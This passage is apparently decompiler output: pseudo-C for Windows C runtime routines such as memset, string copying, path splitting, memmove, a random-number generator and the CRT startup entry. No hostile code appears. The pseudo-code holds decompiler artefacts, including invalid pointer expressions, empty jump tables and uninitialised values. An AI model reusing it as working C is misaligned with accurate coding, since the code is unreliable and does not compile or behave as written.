		byte ecx_164[] = dwLoc08_246;
		if (dwLoc08_246 < eax_77 + ~0x03)
		{
			word32 esi_172 = esi_129 + eax_105;
			do
			{
				*esi_172 = ecx_164[edi_119];
				++esi_172;
				ecx_164 = (byte (*)[]) (ecx_164 + 1);
			} while (ecx_164 < eax_77 + ~0x03);
		}
	}
	return eax_105;
}

// 004076F0: void fn004076F0(Stack Eq_2 dwArg04, Stack Eq_2 bArg08, Stack Eq_2 dwArg0C)
// Called from:
//      fn004047E2
//      fn00404FC5
//      fn004055FE
//      fn0040AE68
void fn004076F0(Eq_2 dwArg04, Eq_2 bArg08, Eq_2 dwArg0C)
{
	Eq_2 edx_26 = dwArg0C;
	if (dwArg0C == 0x00)
		return;
	Eq_2 al_13 = bArg08;
	Eq_2 edi_17 = dwArg04;
	uint32 eax_36 = (uint32) bArg08;
	if (dwArg0C >= 0x04)
	{
		ui32 ecx_20 = -dwArg04;
		ui32 ecx_21 = ecx_20 & 0x03;
		if ((ecx_20 & 0x03) != 0x00)
		{
			edx_26 = dwArg0C - (ecx_20 & 0x03);
			do
			{
				edi_17.u2->u0 = (byte) bArg08;
				&edi_17.u0->dw0000 = &edi_17.u5->b0001;
				--ecx_21;
				eax_36 = (uint32) bArg08;
			} while (ecx_21 != 0x00);
		}
		ui32 eax_43 = eax_36 * 0x0101;
		al_13 = (byte) eax_43;
		edx_26 &= 0x03;
		uint32 ecx_51 = edx_26 >> 0x02;
		if (ecx_51 != 0x00)
		{
			while (true)
			{
				al_13 = (byte) eax_43;
				if (ecx_51 == 0x00)
					break;
				edi_17.u0->dw0000 = (word32) (eax_43 * 0x00010001);
				&edi_17.u0->dw0000 = &edi_17.u0->dw0004;
				--ecx_51;
			}
			if (edx_26 == 0x00)
				return;
		}
	}
	do
	{
		edi_17.u2->u0 = (byte) al_13;
		&edi_17.u0->dw0000 = &edi_17.u5->b0001;
		--edx_26;
	} while (edx_26 != 0x00);
}

// 00407750: Register word32 fn00407750(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00403CE3
//      fn00404A18
//      fn00404C49
//      fn0040A4EA
//      fn0040AD15
//      fn0040C9AC
word32 fn00407750(Eq_2 dwArg04, Eq_2 dwArg08)
{
	return fn004077C1(dwArg04, dwArg08);
}

// 00407760: void fn00407760(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08)
// Called from:
//      fn00403CE3
//      fn00404A18
//      fn00405B0F
//      fn0040AD15
void fn00407760(Eq_2 dwArg04, Eq_2 dwArg08)
{
	Eq_2 ecx_13 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		do
		{
			&ecx_13.u0->dw0000 = &ecx_13.u5->b0001;
			if (ecx_13.u2->u0 == 0x00)
				goto l004077AF;
		} while ((ecx_13 & 0x03) != 0x00);
	}
	do
	{
		do
		{
			word32 eax_27 = ecx_13.u0->dw0000;
			&ecx_13.u0->dw0000 = &ecx_13.u0->dw0004;
		} while (((~eax_27 ^ eax_27 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_37 = ecx_13.u0->dwFFFFFFFC;
		byte ah_55 = SLICE(eax_37, byte, 8);
		if ((byte) eax_37 == 0x00)
		{
			fn004077C1(ecx_13 - 4, dwArg08);
			return;
		}
		if (ah_55 == 0x00)
		{
			fn004077C1(ecx_13 - 3, dwArg08);
			return;
		}
		if ((eax_37 & 0x00FF0000) == 0x00)
		{
			fn004077C1(ecx_13 - 2, dwArg08);
			return;
		}
	} while ((eax_37 & 0xFF000000) != 0x00);
l004077AF:
	Eq_2 edi_91 = ecx_13 - 1;
	fn004077C1(edi_91, dwArg08);
}

// 004077C1: Register Eq_2 fn004077C1(Register Eq_2 edi, Stack Eq_2 dwArg0C)
// Called from:
//      fn00407750
//      fn00407760
Eq_2 fn004077C1(Eq_2 edi, Eq_2 dwArg0C)
{
	word24 edx_24_8;
	Eq_4008 edx_135;
	Eq_2 ecx_10 = dwArg0C;
	if ((dwArg0C & 0x03) != 0x00)
	{
		do
		{
			byte dl_12 = ecx_10.u2->u0;
			&ecx_10.u0->dw0000 = &ecx_10.u5->b0001;
			edx_135 = SEQ(edx_24_8, dl_12);
			if (dl_12 == 0x00)
				goto l00407838;
			edi.u2->u0 = dl_12;
			&edi.u0->dw0000 = &edi.u5->b0001;
		} while ((ecx_10 & 0x03) != 0x00);
	}
l004077E6:
	edx_135 = ecx_10.u0->dw0000;
	Eq_4035 eax_28 = ecx_10.u0->dw0000;
	byte dl_38 = (byte) edx_135;
	byte dh_53 = SLICE(edx_135, byte, 8);
	Eq_4043 dx_58 = (word16) edx_135;
	&ecx_10.u0->dw0000 = &ecx_10.u0->dw0004;
	if (((~eax_28 ^ (word32) eax_28 + 0x7EFEFEFF) & 0x81010100) != 0x00)
	{
		if (dl_38 == 0x00)
		{
l00407838:
			edi.u2->u0 = (byte) edx_135;
			return;
		}
		if (dh_53 == 0x00)
		{
			edi.u2->u1 = (<anonymous>) dx_58;
			return;
		}
		if ((edx_135 & 0x00FF0000) == 0x00)
		{
			edi.u2->u1 = (<anonymous>) dx_58;
			edi.u5->b0002 = 0x00;
			return;
		}
		if ((edx_135 & 0xFF000000) == 0x00)
		{
			edi.u0->dw0000 = (word32) edx_135;
			return;
		}
	}
	edi.u0->dw0000 = (word32) edx_135;
	&edi.u0->dw0000 = &edi.u0->dw0004;
	goto l004077E6;
}

// 00407840: Register ptr32 fn00407840(Stack Eq_2 dwArg04)
// Called from:
//      fn0040347E
//      fn0040464B
//      fn00404A18
//      fn00405705
//      fn004078BB
//      fn0040A4EA
//      fn0040AD15
ptr32 fn00407840(Eq_2 dwArg04)
{
	Eq_2 ecx_10 = dwArg04;
	if ((dwArg04 & 0x03) != 0x00)
	{
		do
		{
			&ecx_10.u0->dw0000 = &ecx_10.u5->b0001;
			if (ecx_10.u2->u0 == 0x00)
				return ecx_10 - 1 - dwArg04;
		} while ((ecx_10 & 0x03) != 0x00);
	}
	do
	{
		do
		{
			word32 eax_29 = ecx_10.u0->dw0000;
			&ecx_10.u0->dw0000 = &ecx_10.u0->dw0004;
		} while (((~eax_29 ^ eax_29 + 0x7EFEFEFF) & 0x81010100) == 0x00);
		ui32 eax_39 = ecx_10.u0->dwFFFFFFFC;
		byte ah_50 = SLICE(eax_39, byte, 8);
		if ((byte) eax_39 == 0x00)
			return ecx_10 - 4 - dwArg04;
		if (ah_50 == 0x00)
			return ecx_10 - 3 - dwArg04;
		if ((eax_39 & 0x00FF0000) == 0x00)
			return ecx_10 - 2 - dwArg04;
	} while ((eax_39 & 0xFF000000) != 0x00);
	return ecx_10 - 1 - dwArg04;
}

// 004078BB: Register Eq_2 fn004078BB(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Stack Eq_2 dwArg10, Stack Eq_2 dwArg14)
// Called from:
//      fn00404C49
//      fn00405B0F
Eq_2 fn004078BB(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, Eq_2 dwArg10, Eq_2 dwArg14)
{
	Eq_2 dwLoc08_351 = 0x00;
	Eq_2 ebx_19 = dwArg04;
	word24 ecx_24_8_515 = SLICE(dwArg04, word24, 8);
	if (fn00407840(dwArg04) >= 0x01 && (dwArg04.u5)->b0001 == 0x3A)
	{
		if (dwArg08 != 0x00)
		{
			ecx_24_8_515 = SLICE(fn00408977(dwArg08, dwArg04, (byte (*)[]) 0x02), word24, 8);
			dwArg08.u5->b0002 = 0x00;
		}
		&ebx_19.u0->dw0000 = &dwArg04.u5->b0002;
	}
	else if (dwArg08 != 0x00)
		dwArg08.u2->u0 = 0x00;
	Eq_2 ecx_110;
	Eq_2 dwArg08_362 = 0x00;
	Eq_2 eax_117 = ebx_19;
	byte (* esi_222)[] = (byte (*)[]) 0xFF;
	Eq_2 dwArg04_363 = ebx_19;
	if (ebx_19.u2->u0 != 0x00)
	{
		do
		{
			byte cl_99 = eax_117.u2->u0;
			ecx_110 = SEQ(ecx_24_8_515, cl_99);
			if ((g_a494D61[(word32) cl_99] & 0x04) != 0x00)
				&eax_117.u0->dw0000 = &eax_117.u5->b0001;
			else if (cl_99 != 0x2F && cl_99 != 0x5C)
			{
				ecx_110 = SEQ(ecx_24_8_515, cl_99);
				if (cl_99 == 0x2E)
					dwLoc08_351 = eax_117;
			}
			else
			{
				&ecx_110.u0->dw0000 = &eax_117.u5->b0001;
				dwArg08_362 = ecx_110;
			}
			ecx_24_8_515 = SLICE(ecx_110, word24, 8);
			&eax_117.u0->dw0000 = &eax_117.u5->b0001;
		} while (eax_117.u2->u0 != 0x00);
		dwArg04_363 = eax_117;
		if (dwArg08_362 != 0x00)
		{
			if (dwArg0C != 0x00)
			{
				byte (* edi_148)[] = dwArg08_362 - ebx_19;
				if (edi_148 >= (byte (*)[]) 0xFF)
					edi_148 = (byte (*)[]) 0xFF;
				ecx_110 = fn00408977(dwArg0C, ebx_19, edi_148);
				Mem183[edi_148 + dwArg0C:byte] = 0x00;
			}
			ebx_19 = dwArg08_362;
l00407982:
			if (dwLoc08_351 != 0x00 && dwLoc08_351 >= ebx_19)
			{
				if (dwArg10 != 0x00)
				{
					byte (* edi_266)[] = dwLoc08_351 - ebx_19;
					if (edi_266 >= (byte (*)[]) 0xFF)
						edi_266 = (byte (*)[]) 0xFF;
					ecx_110 = fn00408977(dwArg10, ebx_19, edi_266);
					Mem292[edi_266 + dwArg10:byte] = 0x00;
					eax_117 = dwArg04_363;
				}
				if (dwArg14 != 0x00)
				{
					byte (* eax_305)[] = eax_117 - dwLoc08_351;
					if (eax_305 < (byte (*)[]) 0xFF)
						esi_222 = eax_305;
					ecx_110 = fn00408977(dwArg14, dwLoc08_351, esi_222);
					Mem333[esi_222 + dwArg14:byte] = 0x00;
				}
			}
			else
			{
				if (dwArg10 != 0x00)
				{
					byte (* eax_214)[] = eax_117 - ebx_19;
					if (eax_214 < (byte (*)[]) 0xFF)
						esi_222 = eax_214;
					ecx_110 = fn00408977(dwArg10, ebx_19, esi_222);
					Mem247[esi_222 + dwArg10:byte] = 0x00;
				}
				if (dwArg14 != 0x00)
					dwArg14.u2->u0 = 0x00;
			}
			return ecx_110;
		}
	}
	ecx_110 = dwArg0C;
	if (dwArg0C != 0x00)
		dwArg0C.u2->u0 = 0x00;
	goto l00407982;
}

// 00407ACE: Register Eq_4295 fn00407ACE(Register Eq_1917 ecx, Stack Eq_4295 dwArg04, Register out Eq_1917 ecxOut)
// Called from:
//      fn0040C920
Eq_4295 fn00407ACE(Eq_1917 ecx, Eq_4295 dwArg04, union Eq_1917 & ecxOut)
{
	ptr32 fp;
	Eq_1281 tLoc08;
	byte bLoc07;
	Eq_4295 eax_147;
	tLoc08 = (Eq_1281) ecx;
	if (g_t49393C.u0 == 0x00)
	{
		eax_147 = dwArg04;
		if (dwArg04 >= 0x41 && dwArg04 <= 0x5A)
			eax_147 = (word32) dwArg04.u0 + 32;
		goto l00407B94;
	}
	if (dwArg04 < 0x0100)
	{
		ui32 eax_36;
		if (g_dw412C1C > 0x01)
		{
			eax_36 = fn00408C50(dwArg04, SLICE(dwArg04, WORD, 16), 0x01);
			ecx.u0 = 0x01;
		}
		else
		{
			Eq_10146 eax_32[] = g_ptr412A10;
			eax_36 = SEQ(SLICE(eax_32, word24, 8), eax_32[dwArg04].t0000.u0) & 0x01;
		}
		if (eax_36 == 0x00)
		{
l00407B2B:
			eax_147 = dwArg04;
			goto l00407B94;
		}
	}
	Eq_2 eax_113;
	if ((g_ptr412A10[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
		&eax_113.u0->dw0000 = 0x02;
	else
		&eax_113.u0->dw0000 = 0x01;
	Eq_2 eax_129 = fn00408A01(g_t49393C.u0, 0x0100, fp + 4, eax_113, &tLoc08, 0x03, 0x00, 0x01, out ecx);
	if (eax_129 != 0x00)
	{
		if (eax_129 == 0x01)
			eax_147 = (word32) tLoc08;
		else
		{
			ecx = (word32) tLoc08;
			eax_147 = (word32) bLoc07 << 0x08 | ecx;
		}
l00407B94:
		ecxOut = ecx;
		return eax_147;
	}
	goto l00407B2B;
}

// 00407BEB: Register word32 fn00407BEB(Stack Eq_2 dwArg04)
// Called from:
//      fn00405B0F
word32 fn00407BEB(Eq_2 dwArg04)
{
	word32 ebp_11;
	fn004095E4(dwArg04, out ebp_11);
	return ebp_11;
}

// 00407C00: Register ptr32 fn00407C00(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack Eq_2 dwArg0C, Register out Eq_2 esiOut, Register out Eq_2 ediOut)
// Called from:
//      fn00405705
//      fn00406DFD
//      fn0040A7F0
ptr32 fn00407C00(Eq_2 dwArg04, Eq_2 dwArg08, Eq_2 dwArg0C, union Eq_2 & esiOut, union Eq_2 & ediOut)
{
	ptr32 fp;
	ptr32 ebp;
	Eq_2 edi;
	Eq_2 esi;
	Eq_2 esi_14 = dwArg08;
	Eq_2 edi_16 = dwArg04;
	word32 eax_19 = dwArg0C + dwArg08;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_19)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
				{
				case 0x00:
					esiOut = esi;
					ediOut = edi;
					return ebp;
				case 0x01:
					dwArg04.u2->u0 = dwArg08.u2->u0;
					esiOut = esi;
					ediOut = edi;
					return ebp;
				case 0x02:
					dwArg04.u2->u0 = dwArg08.u2->u0;
					dwArg04.u5->b0001 = dwArg08.u5->b0001;
					esiOut = esi;
					ediOut = edi;
					return ebp;
				case 0x03:
					dwArg04.u2->u0 = dwArg08.u2->u0;
					dwArg04.u5->b0001 = dwArg08.u5->b0001;
					dwArg04.u5->b0002 = dwArg08.u5->b0002;
					esiOut = esi;
					ediOut = edi;
					return ebp;
				}
			}
			else
			{
				(*((char *) g_a407C60 + (dwArg04 & 0x03) * 0x04))();
				esiOut = dwArg08;
				ediOut = dwArg04;
				return fp - 4;
			}
		}
		else if (dwArg0C >> 0x02 < 0x08)
		{
			switch (dwArg0C >> 0x02)
			{
			case 0x00:
				goto l00407D3F;
			case 0x01:
				goto l00407D2C;
			case 0x02:
				goto l00407D24;
			case 0x03:
				goto l00407D1C;
			case 0x04:
				goto l00407D14;
			case 0x05:
				goto l00407D0C;
			case 0x06:
				break;
			case 0x07:
				(dwArg04 - 28)[dwArg0C >> 0x02] = (dwArg08 - 28)[dwArg0C >> 0x02];
				break;
			}
			(dwArg04 - 24)[dwArg0C >> 0x02] = (dwArg08 - 24)[dwArg0C >> 0x02];
l00407D0C:
			(dwArg04 - 20)[dwArg0C >> 0x02] = (dwArg08 - 20)[dwArg0C >> 0x02];
l00407D14:
			(dwArg04 - 16)[dwArg0C >> 0x02] = (dwArg08 - 16)[dwArg0C >> 0x02];
l00407D1C:
			(dwArg04 - 0x0C)[dwArg0C >> 0x02] = (dwArg08 - 0x0C)[dwArg0C >> 0x02];
l00407D24:
			(dwArg04 - 8)[dwArg0C >> 0x02] = (dwArg08 - 8)[dwArg0C >> 0x02];
l00407D2C:
			(dwArg04 - 4)[dwArg0C >> 0x02] = (dwArg08 - 4)[dwArg0C >> 0x02];
			int32 eax_241 = (dwArg0C >> 0x02) * 0x04;
			&esi_14.u0->dw0000 = dwArg08.u0 + eax_241 / 0x00001000;
			&edi_16.u0->dw0000 = dwArg04.u0 + eax_241 / 0x00001000;
l00407D3F:
			(*((char *) g_a407D48 + (dwArg0C & 0x03) * 0x04))();
			esiOut = esi_14;
			ediOut = edi_16;
			return fp - 4;
		}
		else
		{
			Eq_4443 size_282 = (dwArg0C >> 0x02) * 0x04;
			memcpy(dwArg04, dwArg08, size_282);
			(*((char *) g_a407D48 + (dwArg0C & 0x03) * 0x04))();
			esiOut = dwArg08 + size_282;
			ediOut = dwArg04 + size_282;
			return fp - 4;
		}
	}
	else
	{
		Eq_2 esi_102 = dwArg08.u0 + (dwArg0C - 4) / 0x00001000;
		Eq_2 edi_105 = dwArg04.u0 + (dwArg0C - 4) / 0x00001000;
		if ((edi_105 & 0x03) == 0x00)
		{
			uint32 ecx_130 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C >> 0x02)
				{
				case 0x00:
					(*((char *) g_a407EE0 + (dwArg0C & 0x03) * 0x04))();
					esiOut = esi_102;
					ediOut = edi_105;
					return fp - 4;
				}
			}
			for (; ecx_130 != 0x00; --ecx_130)
			{
				edi_105.u0->dw0000 = esi_102.u0->dw0000;
				esi_102 -= 4;
				edi_105 -= 4;
			}
			switch (dwArg0C)
			{
			case 0x00:
				break;
			case 0x01:
				goto l00407EF8;
			case 0x02:
				goto l00407F08;
			case 0x03:
				goto l00407F1C;
			}
		}
		else
		{
			if (dwArg0C >= 0x04)
			{
				(*((char *) g_a407DE8 + (edi_105 & 0x03) * 0x04))();
				esiOut = esi_102;
				ediOut = edi_105;
				return fp - 4;
			}
			switch (dwArg0C)
			{
			case 0x00:
				break;
			case 0x01:
l00407EF8:
				edi_105.u5->b0003 = esi_102.u5->b0003;
				esiOut = esi;
				ediOut = edi;
				return ebp;
			case 0x02:
l00407F08:
				edi_105.u5->b0003 = esi_102.u5->b0003;
				edi_105.u5->b0002 = esi_102.u5->b0002;
				esiOut = esi;
				ediOut = edi;
				return ebp;
			case 0x03:
l00407F1C:
				edi_105.u5->b0003 = esi_102.u5->b0003;
				edi_105.u5->b0002 = esi_102.u5->b0002;
				edi_105.u5->b0001 = esi_102.u5->b0001;
				esiOut = esi;
				ediOut = edi;
				return ebp;
			}
		}
		esiOut = esi;
		ediOut = edi;
		return ebp;
	}
}

<anonymous> * g_a407C60[] = // 00407C60
	{
	};
<anonymous> * g_a407D48[] = // 00407D48
	{
	};
<anonymous> * g_a407DE8[] = // 00407DE8
	{
	};
<anonymous> * g_a407EE0[] = // 00407EE0
	{
	};
// 00407F35: void fn00407F35(Stack Eq_2 dwArg04)
// Called from:
//      fn004047B6
void fn00407F35(Eq_2 dwArg04)
{
	g_t412900.u0 = (BOOL) dwArg04;
}

// 00407F3F: Register ui32 fn00407F3F()
// Called from:
//      fn004047B6
ui32 fn00407F3F()
{
	Eq_2 eax_7 = g_t412900.u0 *s 0x000343FD + 2531011;
	g_t412900.u0 = (BOOL) eax_7;
	return eax_7 >> 0x10 & 0x7FFF;
}

// 00407F60: void fn00407F60(Register uint32 eax, Stack Eq_2 dwArg00)
// Called from:
//      fn00406DFD
//      fn00408A01
//      fn0040AE68
void fn00407F60(uint32 eax, Eq_2 dwArg00)
{
	ptr32 fp;
	ptr32 ecx_11 = fp + 4;
	for (; eax >= 0x1000; eax -= 0x1000)
		ecx_11 -= 0x1000;
	(ecx_11 - eax)->tFFFFFFFC.u0 = (BOOL) dwArg00;
}

// 00407F8F: Register word32 fn00407F8F(Stack Eq_2 dwArg04)
// Called from:
//      fn004055FE
//      fn0040756C
word32 fn00407F8F(Eq_2 dwArg04)
{
	return fn00409625(dwArg04, 0x01);
}

// 00407FE0: Register ptr32 fn00407FE0(Stack Eq_2 dwArg04, Stack Eq_2 dwArg08, Stack uint32 dwArg0C, Register out Eq_2 esiOut)
// Called from:
//      fn0040B5DE
ptr32 fn00407FE0(Eq_2 dwArg04, Eq_2 dwArg08, uint32 dwArg0C, union Eq_2 & esiOut)
{
	ptr32 fp;
	ptr32 ebp;
	Eq_2 esi;
	Eq_2 esi_14 = dwArg08;
	Eq_2 eax_19 = dwArg08.u0 + dwArg0C / 0x00001000;
	if (dwArg04 <= dwArg08 || dwArg04 >= eax_19)
	{
		if ((dwArg04 & 0x03) != 0x00)
		{
			if (dwArg0C < 0x04)
			{
				switch (dwArg0C)
				{
				case 0x00:
					esiOut = esi;
					return ebp;
				case 0x01:
					dwArg04.u2->u0 = dwArg08.u2->u0;
					esiOut = esi;
					return ebp;
				case 0x02:
					dwArg04.u2->u0 = dwArg08.u2->u0;
					dwArg04.u5->b0001 = dwArg08.u5->b0001;
					esiOut = esi;
					return ebp;
				case 0x03:
					dwArg04.u2->u0 = dwArg08.u2->u0;
					dwArg04.u5->b0001 = dwArg08.u5->b0001;
					dwArg04.u5->b0002 = dwArg08.u5->b0002;
					esiOut = esi;
					return ebp;
				}
			}
			else
			{
				(*((char *) g_a408040 + (dwArg04 & 0x03) * 0x04))();
				esiOut = dwArg08;
				return fp - 4;
			}
		}
		else if (dwArg0C >> 0x02 < 0x08)
		{
			switch (dwArg0C >> 0x02)
			{
			case 0x00:
				goto l0040811F;
			case 0x01:
				goto l0040810C;
			case 0x02:
				goto l00408104;
			case 0x03:
				goto l004080FC;
			case 0x04:
				goto l004080F4;
			case 0x05:
				goto l004080EC;
			case 0x06:
				break;
			case 0x07:
				(dwArg04 - 28)[dwArg0C >> 0x02] = (dwArg08 - 28)[dwArg0C >> 0x02];
				break;
			}
			(dwArg04 - 24)[dwArg0C >> 0x02] = (dwArg08 - 24)[dwArg0C >> 0x02];
l004080EC:
			(dwArg04 - 20)[dwArg0C >> 0x02] = (dwArg08 - 20)[dwArg0C >> 0x02];
l004080F4:
			(dwArg04 - 16)[dwArg0C >> 0x02] = (dwArg08 - 16)[dwArg0C >> 0x02];
l004080FC:
			(dwArg04 - 0x0C)[dwArg0C >> 0x02] = (dwArg08 - 0x0C)[dwArg0C >> 0x02];
l00408104:
			(dwArg04 - 8)[dwArg0C >> 0x02] = (dwArg08 - 8)[dwArg0C >> 0x02];
l0040810C:
			(dwArg04 - 4)[dwArg0C >> 0x02] = (dwArg08 - 4)[dwArg0C >> 0x02];
			&esi_14.u0->dw0000 = dwArg08.u0 + ((dwArg0C >> 0x02) * 0x04) / 0x00001000;
l0040811F:
			(*((char *) g_a408128 + (dwArg0C & 0x03) * 0x04))();
			esiOut = esi_14;
			return fp - 4;
		}
		else
		{
			Eq_4747 size_282 = (dwArg0C >> 0x02) * 0x04;
			memcpy(dwArg04, dwArg08, size_282);
			(*((char *) g_a408128 + (dwArg0C & 0x03) * 0x04))();
			esiOut = dwArg08 + size_282;
			return fp - 4;
		}
	}
	else
	{
		Eq_2 esi_102 = dwArg08.u0 + (dwArg0C - 4) / 0x00001000;
		struct Eq_4732 * edi_105 = dwArg04.u0 + (dwArg0C - 4) / 0x00001000;
		if ((edi_105 & 0x03) == 0x00)
		{
			uint32 ecx_130 = dwArg0C >> 0x02;
			if (dwArg0C >> 0x02 < 0x08)
			{
				switch (dwArg0C >> 0x02)
				{
				case 0x00:
					(*((char *) g_a4082C0 + (dwArg0C & 0x03) * 0x04))();
					esiOut = esi_102;
					return fp - 4;
				}
			}
			for (; ecx_130 != 0x00; --ecx_130)
			{
				edi_105->dw0000 = esi_102.u0->dw0000;
				esi_102 -= 4;
				edi_105 -= 4;
			}
			switch (dwArg0C)
			{
			case 0x00:
				break;
			case 0x01:
				goto l004082D8;
			case 0x02:
				goto l004082E8;
			case 0x03:
				goto l004082FC;
			}
		}
		else
		{
			if (dwArg0C >= 0x04)
			{
				(*((char *) g_a4081C8 + (edi_105 & 0x03) * 0x04))();
				esiOut = esi_102;
				return fp - 4;
			}
			switch (dwArg0C)
			{
			case 0x00:
				break;
			case 0x01:
l004082D8:
				edi_105->b0003 = esi_102.u5->b0003;
				esiOut = esi;
				return ebp;
			case 0x02:
l004082E8:
				edi_105->b0003 = esi_102.u5->b0003;
				edi_105->b0002 = esi_102.u5->b0002;
				esiOut = esi;
				return ebp;
			case 0x03:
l004082FC:
				edi_105->b0003 = esi_102.u5->b0003;
				edi_105->b0002 = esi_102.u5->b0002;
				edi_105->b0001 = esi_102.u5->b0001;
				esiOut = esi;
				return ebp;
			}
		}
		esiOut = esi;
		return ebp;
	}
}

<anonymous> * g_a408040[] = // 00408040
	{
	};
<anonymous> * g_a408128[] = // 00408128
	{
	};
<anonymous> * g_a4081C8[] = // 004081C8
	{
	};
<anonymous> * g_a4082C0[] = // 004082C0
	{
	};
// 00408420: Register Eq_2 fn00408420(Stack Eq_2 dwArg04, Stack (ptr32 Eq_2804) dwArg08, Stack Eq_2 dwArg0C)
// Called from:
//      fn00405705
Eq_2 fn00408420(Eq_2 dwArg04, <unknown> * dwArg08, Eq_2 dwArg0C)
{
	Eq_2 ecx_17 = dwArg0C;
	if (dwArg0C == 0x00)
		return ecx_17;
	Eq_2 edi_19 = dwArg04;
	while (ecx_17 != 0x00)
	{
		&edi_19.u0->dw0000 = &edi_126.u5->b0001;
		--ecx_17;
		edi_126 = edi_19;
		if (edi_126.u2->u0 != 0x00)
			break;
	}
	memcmp(dwArg08, dwArg04, dwArg0C.u0 + -ecx_17 / 0x00001000);
	int32 firstDifference_46 = __find_first_difference__(dwArg08, dwArg04);
	struct Eq_4995 * edi_49 = dwArg04.u0 + firstDifference_46 / 0x00001000;
	cu8 al_50 = ((char *) dwArg08 + firstDifference_46)[-1];
	&ecx_17.u0->dw0000 = 0x00;
	if (al_50 <= edi_49->bFFFFFFFF)
	{
		if (al_50 == edi_49->bFFFFFFFF)
			return ecx_17;
		&ecx_17.u0->dw0000 = ~0x01;
	}
	ecx_17 = ~ecx_17;
	return ecx_17;
}

// 00408458: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	struct Eq_5027 * fs;
	fs->ptr0000 = fp - 20;
	Eq_2 eax_30 = GetVersion();
	uint32 edx_35 = (uint32) SLICE(eax_30, byte, 8);
	g_dw49396C = edx_35;
	g_dw493968 = eax_30 & 0xFF;
	g_dw493964 = ((eax_30 & 0xFF) << 0x08) + edx_35;
	g_dw493960 = eax_30 >> 0x10;
	if (fn0040AACD(0x00) != 0x00)
	{
		fn0040A922();
		g_t494E68.u0 = (BOOL) GetCommandLineA();
		word32 ecx_78;
		g_t493920.u0 = (BOOL) fn0040A7F0(out ecx_78);
		fn0040A5A3(ecx_78);
		struct Eq_5083 * ebp_94 = fn0040A4EA();
		fn0040A20C();
		ebp_94->dwFFFFFFD0 = 0x00;
		GetStartupInfoA(ebp_94 - 92);
		ebp_94->dwFFFFFF9C = fn0040A492();
		(ebp_94->dwFFFFFFD0 & 0x01) == 0x00;
		GetModuleHandleA(0x00);
		struct Eq_5123 * ebp_148;
		Eq_2 eax_147 = fn004073E2(out ebp_148);
		ebp_148->tFFFFFFA0.u0 = (BOOL) eax_147;
		fn0040A239(eax_147);
		struct _EXCEPTION_POINTERS * eax_172 = ebp_148->ptrFFFFFFEC;
		word32 ecx_174 = eax_172->ExceptionRecord->ExceptionCode;
		ebp_148->dwFFFFFF98 = ecx_174;
		return fn0040A30E(ecx_174, eax_172);
	}
	else
		fn00408573(0x1C);
}

// 0040854E: Register word32 fn0040854E(Stack Eq_2 dwArg04)
// Called from:
//      fn0040A4EA
//      fn0040A5A3
//      fn0040A922
word32 fn0040854E(Eq_2 dwArg04)
{
	if (g_dw493928 == 0x01)
		fn0040ACDC();
	word32 edi_24 = fn0040AD15(dwArg04);
	g_ptr412910();
	return edi_24;
}

// 00408573: void fn00408573(Stack Eq_2 dwArg04)
// Called from:
//      Win32CrtStartup
void fn00408573(Eq_2 dwArg04)
{
	if (g_dw493928 == 0x01)
		fn0040ACDC();
	fn0040AD15(dwArg04);
	ExitProcess(0xFF);
}

// 00408597: void fn00408597(Stack Eq_2 dwArg04)
// Called from:
//      fn0040895B
void fn00408597(Eq_2 dwArg04)
{
	Eq_5184 tLoc1C;
	Eq_2 eax_22 = fn00408730(dwArg04);
	if (eax_22 == g_t494C38.u0)
		return;
	if (eax_22 != 0x00)
	{
		ui32 edx_163 = 0x00;
		union Eq_2 * eax_162 = g_a412920;
		do
		{
			if (eax_162->u0 == eax_22)
			{
				word32 ecx_161;
				struct Eq_5204 * edi_160 = g_a494D60;
				for (ecx_161 = 0x40; ecx_161 != 0x00; --ecx_161)
				{
					edi_160->b0000 = (byte) 0x00;
					++edi_160;
				}
				edi_160->b0000 = 0x00;
				ui32 esi_58 = edx_163 * 0x03;
				byte * dwLoc08_351 = g_a412918;
				union Eq_5345 * ebx_116 = (esi_58 << 0x04) + 0x00412930;
				do
				{
					union Eq_5345 * ecx_101 = ebx_116;
					if (ebx_116->u0.b0000 != 0x00)
					{
						do
						{
							byte dl_76 = (&ecx_101->u0)[1];
							if (dl_76 == 0x00)
								break;
							struct Eq_5374 * eax_81 = (word32) ecx_101->u0.b0000;
							struct Eq_5374 * edi_82 = (word32) dl_76;
							if (eax_81 <= edi_82)
							{
								byte dl_87 = *dwLoc08_351;
								do
								{
									eax_81[0x00494D61] = (struct Eq_5374) (eax_81[0x00494D61] | dl_87);
									++eax_81;
								} while (eax_81 <= edi_82);
							}
							struct Eq_5382 * ecx_100 = &ecx_101->u0 + 1;
							ecx_101 = (union Eq_5345 *) &ecx_100->b0001;
						} while (ecx_100->b0001 != 0x00);
					}
					byte * v26_110 = dwLoc08_351 + 1;
					dwLoc08_351 = v26_110;
					ebx_116 = (union Eq_5345 *) ((char *) ebx_116 + 8);
				} while (v26_110 < (byte *) 4290696940);
				g_dw494C4C = 0x01;
				g_t494C38.u0 = (BOOL) eax_22;
				Eq_2 eax_130 = fn0040877A(eax_22);
				struct Eq_5416 * esi_140 = (esi_58 << 0x04) + 0x00412924;
				g_dw494C40 = esi_140->dw0000;
				g_dw494C44 = esi_140->dw0004;
				g_t494E64.u0 = (BOOL) eax_130;
				g_dw494C48 = esi_140->dw0008;
				goto l0040871F;
			}
			eax_162 = (union Eq_2 *) ((char *) eax_162 + 48);
			++edx_163;
		} while (eax_162 < &g_ptr412A10);
		if (GetCPInfo(eax_22, &tLoc1C) == 0x01)
		{
			g_t494C38.u0 = (BOOL) eax_22;
			word32 ecx_193;
			struct Eq_5231 * edi_195 = g_a494D60;
			for (ecx_193 = 0x40; ecx_193 != 0x00; --ecx_193)
			{
